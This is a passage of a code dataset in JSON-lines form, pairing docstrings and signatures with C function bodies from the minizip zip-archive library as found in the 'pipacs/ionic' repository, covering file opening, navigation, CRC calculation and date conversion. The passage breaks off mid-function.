{"docstring": "/*\n  Open for reading data the current file in the zipfile.\n  If there is no error and the file is opened, the return value is UNZ_OK.\n*/\n", "func_signal": "extern int ZEXPORT unzOpenCurrentFile3 (unzFile file, int* method,\n                                            int* level, int raw, const char* password)", "code": "{\n    int err=UNZ_OK;\n    uInt iSizeVar;\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    ZPOS64_T offset_local_extrafield;  /* offset of the local extra field */\n    uInt  size_local_extrafield;    /* size of the local extra field */\n#    ifndef NOUNCRYPT\n    char source[12];\n#    else\n    if (password != NULL)\n        return UNZ_PARAMERROR;\n#    endif\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_PARAMERROR;\n\n    if (s->pfile_in_zip_read != NULL)\n        unzCloseCurrentFile(file);\n\n    if (unz64local_CheckCurrentFileCoherencyHeader(s,&iSizeVar, &offset_local_extrafield,&size_local_extrafield)!=UNZ_OK)\n        return UNZ_BADZIPFILE;\n\n    pfile_in_zip_read_info = (file_in_zip64_read_info_s*)ALLOC(sizeof(file_in_zip64_read_info_s));\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_INTERNALERROR;\n\n    pfile_in_zip_read_info->read_buffer=(char*)ALLOC(UNZ_BUFSIZE);\n    pfile_in_zip_read_info->offset_local_extrafield = offset_local_extrafield;\n    pfile_in_zip_read_info->size_local_extrafield = size_local_extrafield;\n    pfile_in_zip_read_info->pos_local_extrafield=0;\n    pfile_in_zip_read_info->raw=raw;\n\n    if (pfile_in_zip_read_info->read_buffer==NULL)\n    {\n        TRYFREE(pfile_in_zip_read_info);\n        return UNZ_INTERNALERROR;\n    }\n\n    pfile_in_zip_read_info->stream_initialised=0;\n\n    if (method!=NULL)\n        *method = (int)s->cur_file_info.compression_method;\n\n    if (level!=NULL)\n    {\n        *level = 6;\n        switch (s->cur_file_info.flag & 0x06)\n        {\n          case 6 : *level = 1; break;\n          case 4 : *level = 2; break;\n          case 2 : *level = 9; break;\n        }\n    }\n\n    if ((s->cur_file_info.compression_method!=0) &&\n/* #ifdef HAVE_BZIP2 */\n        (s->cur_file_info.compression_method!=Z_BZIP2ED) &&\n/* #endif */\n        (s->cur_file_info.compression_method!=Z_DEFLATED))\n\n        err=UNZ_BADZIPFILE;\n\n    pfile_in_zip_read_info->crc32_wait=s->cur_file_info.crc;\n    pfile_in_zip_read_info->crc32=0;\n    pfile_in_zip_read_info->total_out_64=0;\n    pfile_in_zip_read_info->compression_method = s->cur_file_info.compression_method;\n    pfile_in_zip_read_info->filestream=s->filestream;\n    pfile_in_zip_read_info->z_filefunc=s->z_filefunc;\n    pfile_in_zip_read_info->byte_before_the_zipfile=s->byte_before_the_zipfile;\n\n    pfile_in_zip_read_info->stream.total_out = 0;\n\n    if ((s->cur_file_info.compression_method==Z_BZIP2ED) && (!raw))\n    {\n#ifdef HAVE_BZIP2\n      pfile_in_zip_read_info->bstream.bzalloc = (void *(*) (void *, int, int))0;\n      pfile_in_zip_read_info->bstream.bzfree = (free_func)0;\n      pfile_in_zip_read_info->bstream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->bstream.state = (voidpf)0;\n\n      pfile_in_zip_read_info->stream.zalloc = (alloc_func)0;\n      pfile_in_zip_read_info->stream.zfree = (free_func)0;\n      pfile_in_zip_read_info->stream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->stream.next_in = (voidpf)0;\n      pfile_in_zip_read_info->stream.avail_in = 0;\n\n      err=BZ2_bzDecompressInit(&pfile_in_zip_read_info->bstream, 0, 0);\n      if (err == Z_OK)\n        pfile_in_zip_read_info->stream_initialised=Z_BZIP2ED;\n      else\n      {\n        TRYFREE(pfile_in_zip_read_info);\n        return err;\n      }\n#else\n      pfile_in_zip_read_info->raw=1;\n#endif\n    }\n    else if ((s->cur_file_info.compression_method==Z_DEFLATED) && (!raw))\n    {\n      pfile_in_zip_read_info->stream.zalloc = (alloc_func)0;\n      pfile_in_zip_read_info->stream.zfree = (free_func)0;\n      pfile_in_zip_read_info->stream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->stream.next_in = 0;\n      pfile_in_zip_read_info->stream.avail_in = 0;\n\n      err=inflateInit2(&pfile_in_zip_read_info->stream, -MAX_WBITS);\n      if (err == Z_OK)\n        pfile_in_zip_read_info->stream_initialised=Z_DEFLATED;\n      else\n      {\n        TRYFREE(pfile_in_zip_read_info);\n        return err;\n      }\n        /* windowBits is passed < 0 to tell that there is no zlib header.\n         * Note that in this case inflate *requires* an extra \"dummy\" byte\n         * after the compressed stream in order to complete decompression and\n         * return Z_STREAM_END.\n         * In unzip, i don't wait absolutely Z_STREAM_END because I known the\n         * size of both compressed and uncompressed data\n         */\n    }\n    pfile_in_zip_read_info->rest_read_compressed =\n            s->cur_file_info.compressed_size ;\n    pfile_in_zip_read_info->rest_read_uncompressed =\n            s->cur_file_info.uncompressed_size ;\n\n\n    pfile_in_zip_read_info->pos_in_zipfile =\n            s->cur_file_info_internal.offset_curfile + SIZEZIPLOCALHEADER +\n              iSizeVar;\n\n    pfile_in_zip_read_info->stream.avail_in = (uInt)0;\n\n    s->pfile_in_zip_read = pfile_in_zip_read_info;\n                s->encrypted = 0;\n\n#    ifndef NOUNCRYPT\n    if (password != NULL)\n    {\n        int i;\n        s->pcrc_32_tab = get_crc_table();\n        init_keys(password,s->keys,s->pcrc_32_tab);\n        if (ZSEEK64(s->z_filefunc, s->filestream,\n                  s->pfile_in_zip_read->pos_in_zipfile +\n                     s->pfile_in_zip_read->byte_before_the_zipfile,\n                  SEEK_SET)!=0)\n            return UNZ_INTERNALERROR;\n        if(ZREAD64(s->z_filefunc, s->filestream,source, 12)<12)\n            return UNZ_INTERNALERROR;\n\n        for (i = 0; i<12; i++)\n            zdecode(s->keys,s->pcrc_32_tab,source[i]);\n\n        s->pfile_in_zip_read->pos_in_zipfile+=12;\n        s->encrypted=1;\n    }\n#    endif\n\n\n    return UNZ_OK;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n   Compare two filename (fileName1,fileName2).\n   If iCaseSenisivity = 1, comparision is case sensitivity (like strcmp)\n   If iCaseSenisivity = 2, comparision is not case sensitivity (like strcmpi\n                                                                or strcasecmp)\n   If iCaseSenisivity = 0, case sensitivity is defaut of your operating system\n        (like 1 on Unix, 2 on Windows)\n\n*/\n", "func_signal": "extern int ZEXPORT unzStringFileNameCompare (const char*  fileName1,\n                                                 const char*  fileName2,\n                                                 int iCaseSensitivity)", "code": "{\n    if (iCaseSensitivity==0)\n        iCaseSensitivity=CASESENSITIVITYDEFAULTVALUE;\n\n    if (iCaseSensitivity==1)\n        return strcmp(fileName1,fileName2);\n\n    return STRCMPCASENOSENTIVEFUNCTION(fileName1,fileName2);\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/* calculate the CRC32 of a file,\n   because to encrypt a file, we need known the CRC32 of the file before */\n", "func_signal": "int getFileCrc(const char* filenameinzip,void*buf,unsigned long size_buf,unsigned long* result_crc)", "code": "{\n   unsigned long calculate_crc=0;\n   int err=ZIP_OK;\n   FILE * fin = fopen64(filenameinzip,\"rb\");\n   unsigned long size_read = 0;\n   unsigned long total_read = 0;\n   if (fin==NULL)\n   {\n       err = ZIP_ERRNO;\n   }\n\n    if (err == ZIP_OK)\n        do\n        {\n            err = ZIP_OK;\n            size_read = (int)fread(buf,1,size_buf,fin);\n            if (size_read < size_buf)\n                if (feof(fin)==0)\n            {\n                printf(\"error in reading %s\\n\",filenameinzip);\n                err = ZIP_ERRNO;\n            }\n\n            if (size_read>0)\n                calculate_crc = crc32(calculate_crc,buf,size_read);\n            total_read += size_read;\n\n        } while ((err == ZIP_OK) && (size_read>0));\n\n    if (fin)\n        fclose(fin);\n\n    *result_crc=calculate_crc;\n    printf(\"file %s crc %lx\\n\", filenameinzip, calculate_crc);\n    return err;\n}", "path": "backend\\unzip\\minizip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Close a ZipFile opened with unzipOpen.\n  If there is files inside the .Zip opened with unzipOpenCurrentFile (see later),\n    these files MUST be closed with unzipCloseCurrentFile before call unzipClose.\n  return UNZ_OK if there is no problem. */\n", "func_signal": "extern int ZEXPORT unzClose (unzFile file)", "code": "{\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n\n    if (s->pfile_in_zip_read!=NULL)\n        unzCloseCurrentFile(file);\n\n    ZCLOSE64(s->z_filefunc, s->filestream);\n    TRYFREE(s);\n    return UNZ_OK;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Get the global comment string of the ZipFile, in the szComment buffer.\n  uSizeBuf is the size of the szComment buffer.\n  return the number of byte copied or an error code <0\n*/\n", "func_signal": "extern int ZEXPORT unzGetGlobalComment (unzFile file, char * szComment, uLong uSizeBuf)", "code": "{\n    unz64_s* s;\n    uLong uReadThis ;\n    if (file==NULL)\n        return (int)UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n\n    uReadThis = uSizeBuf;\n    if (uReadThis>s->gi.size_comment)\n        uReadThis = s->gi.size_comment;\n\n    if (ZSEEK64(s->z_filefunc,s->filestream,s->central_pos+22,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n    if (uReadThis>0)\n    {\n      *szComment='\\0';\n      if (ZREAD64(s->z_filefunc,s->filestream,szComment,uReadThis)!=uReadThis)\n        return UNZ_ERRNO;\n    }\n\n    if ((szComment != NULL) && (uSizeBuf > s->gi.size_comment))\n        *(szComment+s->gi.size_comment)='\\0';\n    return (int)uReadThis;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\ntypedef struct unz_file_pos_s\n{\n    ZPOS64_T pos_in_zip_directory;   // offset in file\n    ZPOS64_T num_of_file;            // # of file\n} unz_file_pos;\n*/\n", "func_signal": "extern int ZEXPORT unzGetFilePos64(unzFile file, unz64_file_pos*  file_pos)", "code": "{\n    unz64_s* s;\n\n    if (file==NULL || file_pos==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    file_pos->pos_in_zip_directory  = s->pos_in_central_dir;\n    file_pos->num_of_file           = s->num_file;\n\n    return UNZ_OK;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Close the file in zip opened with unzipOpenCurrentFile\n  Return UNZ_CRCERROR if all the file was read but the CRC is not good\n*/\n", "func_signal": "extern int ZEXPORT unzCloseCurrentFile (unzFile file)", "code": "{\n    int err=UNZ_OK;\n\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n\n    if ((pfile_in_zip_read_info->rest_read_uncompressed == 0) &&\n        (!pfile_in_zip_read_info->raw))\n    {\n        if (pfile_in_zip_read_info->crc32 != pfile_in_zip_read_info->crc32_wait)\n            err=UNZ_CRCERROR;\n    }\n\n\n    TRYFREE(pfile_in_zip_read_info->read_buffer);\n    pfile_in_zip_read_info->read_buffer = NULL;\n    if (pfile_in_zip_read_info->stream_initialised == Z_DEFLATED)\n        inflateEnd(&pfile_in_zip_read_info->stream);\n#ifdef HAVE_BZIP2\n    else if (pfile_in_zip_read_info->stream_initialised == Z_BZIP2ED)\n        BZ2_bzDecompressEnd(&pfile_in_zip_read_info->bstream);\n#endif\n\n\n    pfile_in_zip_read_info->stream_initialised = 0;\n    TRYFREE(pfile_in_zip_read_info);\n\n    s->pfile_in_zip_read=NULL;\n\n    return err;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Set the current file of the zipfile to the next file.\n  return UNZ_OK if there is no problem\n  return UNZ_END_OF_LIST_OF_FILE if the actual file was the latest.\n*/\n", "func_signal": "extern int ZEXPORT unzGoToNextFile (unzFile  file)", "code": "{\n    unz64_s* s;\n    int err;\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n    if (s->gi.number_entry != 0xffff)    /* 2^16 files overflow hack */\n      if (s->num_file+1==s->gi.number_entry)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    s->pos_in_central_dir += SIZECENTRALDIRITEM + s->cur_file_info.size_filename +\n            s->cur_file_info.size_file_extra + s->cur_file_info.size_file_comment ;\n    s->num_file++;\n    err = unz64local_GetCurrentFileInfoInternal(file,&s->cur_file_info,\n                                               &s->cur_file_info_internal,\n                                               NULL,0,NULL,0,NULL,0);\n    s->current_file_ok = (err == UNZ_OK);\n    return err;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Try locate the file szFileName in the zipfile.\n  For the iCaseSensitivity signification, see unzipStringFileNameCompare\n\n  return value :\n  UNZ_OK if the file is found. It becomes the current file.\n  UNZ_END_OF_LIST_OF_FILE if the file is not found\n*/\n", "func_signal": "extern int ZEXPORT unzLocateFile (unzFile file, const char *szFileName, int iCaseSensitivity)", "code": "{\n    unz64_s* s;\n    int err;\n\n    /* We remember the 'current' position in the file so that we can jump\n     * back there if we fail.\n     */\n    unz_file_info64 cur_file_infoSaved;\n    unz_file_info64_internal cur_file_info_internalSaved;\n    ZPOS64_T num_fileSaved;\n    ZPOS64_T pos_in_central_dirSaved;\n\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n\n    if (strlen(szFileName)>=UNZ_MAXFILENAMEINZIP)\n        return UNZ_PARAMERROR;\n\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    /* Save the current state */\n    num_fileSaved = s->num_file;\n    pos_in_central_dirSaved = s->pos_in_central_dir;\n    cur_file_infoSaved = s->cur_file_info;\n    cur_file_info_internalSaved = s->cur_file_info_internal;\n\n    err = unzGoToFirstFile(file);\n\n    while (err == UNZ_OK)\n    {\n        char szCurrentFileName[UNZ_MAXFILENAMEINZIP+1];\n        err = unzGetCurrentFileInfo64(file,NULL,\n                                    szCurrentFileName,sizeof(szCurrentFileName)-1,\n                                    NULL,0,NULL,0);\n        if (err == UNZ_OK)\n        {\n            if (unzStringFileNameCompare(szCurrentFileName,\n                                            szFileName,iCaseSensitivity)==0)\n                return UNZ_OK;\n            err = unzGoToNextFile(file);\n        }\n    }\n\n    /* We failed, so restore the state of the 'current file' to where we\n     * were.\n     */\n    s->num_file = num_fileSaved ;\n    s->pos_in_central_dir = pos_in_central_dirSaved ;\n    s->cur_file_info = cur_file_infoSaved;\n    s->cur_file_info_internal = cur_file_info_internalSaved;\n    return err;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/** Addition for GDAL : START */\n", "func_signal": "extern ZPOS64_T ZEXPORT unzGetCurrentFileZStreamPos64( unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    s=(unz64_s*)file;\n    if (file==NULL)\n        return 0; //UNZ_PARAMERROR;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n    if (pfile_in_zip_read_info==NULL)\n        return 0; //UNZ_PARAMERROR;\n    return pfile_in_zip_read_info->pos_in_zipfile +\n                         pfile_in_zip_read_info->byte_before_the_zipfile;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Write info about the ZipFile in the *pglobal_info structure.\n  No preparation of the structure is needed\n  return UNZ_OK if there is no problem. */\n", "func_signal": "extern int ZEXPORT unzGetGlobalInfo64 (unzFile file, unz_global_info64* pglobal_info)", "code": "{\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    *pglobal_info=s->gi;\n    return UNZ_OK;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Open a Zip file. path contain the full pathname (by example,\n     on a Windows NT computer \"c:\\\\test\\\\zlib114.zip\" or on an Unix computer\n     \"zlib/zlib114.zip\".\n     If the zipfile cannot be opened (file doesn't exist or in not valid), the\n       return value is NULL.\n     Else, the return value is a unzFile Handle, usable with other function\n       of this unzip package.\n*/\n", "func_signal": "local unzFile unzOpenInternal (const void *path,\n                               zlib_filefunc64_32_def* pzlib_filefunc64_32_def,\n                               int is64bitOpenFunction)", "code": "{\n    unz64_s us;\n    unz64_s *s;\n    ZPOS64_T central_pos;\n    uLong   uL;\n\n    uLong number_disk;          /* number of the current dist, used for\n                                   spaning ZIP, unsupported, always 0*/\n    uLong number_disk_with_CD;  /* number the the disk with central dir, used\n                                   for spaning ZIP, unsupported, always 0*/\n    ZPOS64_T number_entry_CD;      /* total number of entries in\n                                   the central dir\n                                   (same than number_entry on nospan) */\n\n    int err=UNZ_OK;\n\n    if (unz_copyright[0]!=' ')\n        return NULL;\n\n    us.z_filefunc.zseek32_file = NULL;\n    us.z_filefunc.ztell32_file = NULL;\n    if (pzlib_filefunc64_32_def==NULL)\n        fill_fopen64_filefunc(&us.z_filefunc.zfile_func64);\n    else\n        us.z_filefunc = *pzlib_filefunc64_32_def;\n    us.is64bitOpenFunction = is64bitOpenFunction;\n\n\n\n    us.filestream = ZOPEN64(us.z_filefunc,\n                                                 path,\n                                                 ZLIB_FILEFUNC_MODE_READ |\n                                                 ZLIB_FILEFUNC_MODE_EXISTING);\n    if (us.filestream==NULL)\n        return NULL;\n\n    central_pos = unz64local_SearchCentralDir64(&us.z_filefunc,us.filestream);\n    if (central_pos)\n    {\n        uLong uS;\n        ZPOS64_T uL64;\n\n        us.isZip64 = 1;\n\n        if (ZSEEK64(us.z_filefunc, us.filestream,\n                                      central_pos,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        err=UNZ_ERRNO;\n\n        /* the signature, already checked */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* size of zip64 end of central directory record */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&uL64)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* version made by */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uS)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* version needed to extract */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uS)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of this disk */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&number_disk)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of the disk with the start of the central directory */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&number_disk_with_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central directory on this disk */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.gi.number_entry)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central directory */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&number_entry_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        if ((number_entry_CD!=us.gi.number_entry) ||\n            (number_disk_with_CD!=0) ||\n            (number_disk!=0))\n            err=UNZ_BADZIPFILE;\n\n        /* size of the central directory */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.size_central_dir)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* offset of start of central directory with respect to the\n          starting disk number */\n        if (unz64local_getLong64(&us.z_filefunc, us.filestream,&us.offset_central_dir)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        us.gi.size_comment = 0;\n    }\n    else\n    {\n        central_pos = unz64local_SearchCentralDir(&us.z_filefunc,us.filestream);\n        if (central_pos==0)\n            err=UNZ_ERRNO;\n\n        us.isZip64 = 0;\n\n        if (ZSEEK64(us.z_filefunc, us.filestream,\n                                        central_pos,ZLIB_FILEFUNC_SEEK_SET)!=0)\n            err=UNZ_ERRNO;\n\n        /* the signature, already checked */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of this disk */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&number_disk)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* number of the disk with the start of the central directory */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&number_disk_with_CD)!=UNZ_OK)\n            err=UNZ_ERRNO;\n\n        /* total number of entries in the central dir on this disk */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.gi.number_entry = uL;\n\n        /* total number of entries in the central dir */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        number_entry_CD = uL;\n\n        if ((number_entry_CD!=us.gi.number_entry) ||\n            (number_disk_with_CD!=0) ||\n            (number_disk!=0))\n            err=UNZ_BADZIPFILE;\n\n        /* size of the central directory */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.size_central_dir = uL;\n\n        /* offset of start of central directory with respect to the\n            starting disk number */\n        if (unz64local_getLong(&us.z_filefunc, us.filestream,&uL)!=UNZ_OK)\n            err=UNZ_ERRNO;\n        us.offset_central_dir = uL;\n\n        /* zipfile comment length */\n        if (unz64local_getShort(&us.z_filefunc, us.filestream,&us.gi.size_comment)!=UNZ_OK)\n            err=UNZ_ERRNO;\n    }\n\n    if ((central_pos<us.offset_central_dir+us.size_central_dir) &&\n        (err==UNZ_OK))\n        err=UNZ_BADZIPFILE;\n\n    if (err!=UNZ_OK)\n    {\n        ZCLOSE64(us.z_filefunc, us.filestream);\n        return NULL;\n    }\n\n    us.byte_before_the_zipfile = central_pos -\n                            (us.offset_central_dir+us.size_central_dir);\n    us.central_pos = central_pos;\n    us.pfile_in_zip_read = NULL;\n    us.encrypted = 0;\n\n\n    s=(unz64_s*)ALLOC(sizeof(unz64_s));\n    if( s != NULL)\n    {\n        *s=us;\n        unzGoToFirstFile((unzFile)s);\n    }\n    return (unzFile)s;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n   Translate date/time from Dos format to tm_unz (readable more easilty)\n*/\n", "func_signal": "local void unz64local_DosDateToTmuDate (ZPOS64_T ulDosDate, tm_unz* ptm)", "code": "{\n    ZPOS64_T uDate;\n    uDate = (ZPOS64_T)(ulDosDate>>16);\n    ptm->tm_mday = (uInt)(uDate&0x1f) ;\n    ptm->tm_mon =  (uInt)((((uDate)&0x1E0)/0x20)-1) ;\n    ptm->tm_year = (uInt)(((uDate&0x0FE00)/0x0200)+1980) ;\n\n    ptm->tm_hour = (uInt) ((ulDosDate &0xF800)/0x800);\n    ptm->tm_min =  (uInt) ((ulDosDate&0x7E0)/0x20) ;\n    ptm->tm_sec =  (uInt) (2*(ulDosDate&0x1f)) ;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  return 1 if the end of file was reached, 0 elsewhere\n*/\n", "func_signal": "extern int ZEXPORT unzeof (unzFile file)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    if (pfile_in_zip_read_info->rest_read_uncompressed == 0)\n        return 1;\n    else\n        return 0;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\nRead extra field from the current file (opened by unzOpenCurrentFile)\nThis is the local-header version of the extra field (sometimes, there is\nmore info in the local-header version than in the central-header)\n\n  if buf==NULL, it return the size of the local extra field that can be read\n\n  if buf!=NULL, len is the size of the buffer, the extra header is copied in\n    buf.\n  the return value is the number of bytes copied in buf, or (if <0)\n    the error code\n*/\n", "func_signal": "extern int ZEXPORT unzGetLocalExtrafield (unzFile file, voidp buf, unsigned len)", "code": "{\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    uInt read_now;\n    ZPOS64_T size_to_read;\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n    size_to_read = (pfile_in_zip_read_info->size_local_extrafield -\n                pfile_in_zip_read_info->pos_local_extrafield);\n\n    if (buf==NULL)\n        return (int)size_to_read;\n\n    if (len>size_to_read)\n        read_now = (uInt)size_to_read;\n    else\n        read_now = (uInt)len ;\n\n    if (read_now==0)\n        return 0;\n\n    if (ZSEEK64(pfile_in_zip_read_info->z_filefunc,\n              pfile_in_zip_read_info->filestream,\n              pfile_in_zip_read_info->offset_local_extrafield +\n              pfile_in_zip_read_info->pos_local_extrafield,\n              ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n    if (ZREAD64(pfile_in_zip_read_info->z_filefunc,\n              pfile_in_zip_read_info->filestream,\n              buf,read_now)!=read_now)\n        return UNZ_ERRNO;\n\n    return (int)read_now;\n}", "path": "backend\\unzip\\unzip.c", "repo_name": "pipacs/ionic", "stars": 39, "license": "other", "language": "c", "size": 7127}
{"docstring": "/*\n  Read the local header of the current zipfile\n  Check the coherency of the local header and info in the end of central\n        directory about this file\n  store in *piSizeVar the size of extra info in local header\n        (filename and size of extra field data)\n*/\n", "func_signal": "local int unz64local_CheckCurrentFileCoherencyHeader (unz64_s* s, uInt* piSizeVar,\n                                                    ZPOS64_T * poffset_local_extrafield,\n                                                    uInt  * psize_local_extrafield)", "code": "{\n    uLong uMagic,uData,uFlags;\n    uLong size_filename;\n    uLong size_extra_field;\n    int err=UNZ_OK;\n\n    *piSizeVar = 0;\n    *poffset_local_extrafield = 0;\n    *psize_local_extrafield = 0;\n\n    if (ZSEEK64(s->z_filefunc, s->filestream,s->cur_file_info_internal.offset_curfile +\n                                s->byte_before_the_zipfile,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n\n    if (err==UNZ_OK)\n    {\n        if (unz64local_getLong(&s->z_filefunc, s->filestream,&uMagic) != UNZ_OK)\n            err=UNZ_ERRNO;\n        else if (uMagic!=0x04034b50)\n            err=UNZ_BADZIPFILE;\n    }\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uData) != UNZ_OK)\n        err=UNZ_ERRNO;\n/*\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.wVersion))\n        err=UNZ_BADZIPFILE;\n*/\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uFlags) != UNZ_OK)\n        err=UNZ_ERRNO;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uData) != UNZ_OK)\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.compression_method))\n        err=UNZ_BADZIPFILE;\n\n    if ((err==UNZ_OK) && (s->cur_file_info.compression_method!=0) &&\n/* #ifdef HAVE_BZIP2 */\n                         (s->cur_file_info.compression_method!=Z_BZIP2ED) &&\n/* #endif */\n                         (s->cur_file_info.compression_method!=Z_DEFLATED))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* date/time */\n        err=UNZ_ERRNO;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* crc */\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.crc) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* size compr */\n        err=UNZ_ERRNO;\n    else if (uData != 0xFFFFFFFF && (err==UNZ_OK) && (uData!=s->cur_file_info.compressed_size) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* size uncompr */\n        err=UNZ_ERRNO;\n    else if (uData != 0xFFFFFFFF && (err==UNZ_OK) && (uData!=s->cur_file_info.uncompressed_size) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&size_filename) != UNZ_OK)\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) 